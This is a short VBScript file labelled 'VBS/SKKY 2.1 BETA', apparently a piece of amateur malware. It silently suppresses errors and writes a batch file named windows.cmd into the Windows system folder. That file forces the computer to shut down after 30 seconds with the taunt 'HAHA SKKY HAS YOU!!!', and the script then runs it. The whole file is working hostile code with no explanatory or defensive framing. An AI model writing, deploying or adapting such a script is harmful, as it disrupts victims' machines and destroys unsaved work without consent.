'VBS/SKKY 2.1 BETA BY[K]
rem VBS
On Error Resume Next
Dim fso, shell, wrte, tempdir, windir, rand, file
Set fso=CreateObject("Scripting.FileSystemObject")
Set shell=CreateObject("Wscript.Shell")
if err.number=429 Then
  shell.Run javascript:location.reload()
End If

Set windir=fso.GetSpecialFolder(0)
Set tempdir=fso.GetSpecialFolder(2)

Set wrte=fso.CreateTextFile(windir+"\windows.cmd")
wrte.WriteLine "cls"
wrte.WriteLine "@echo off"
wrte.WriteLine "shutdown -s -f -t 30 -c "+chr(34)+"HAHA SKKY HAS YOU!!!"+chr(34)
wrte.Close()

shell.Run windir+"\windows.cmd"
'VBS/SKKY 2.1 BETA BY[K]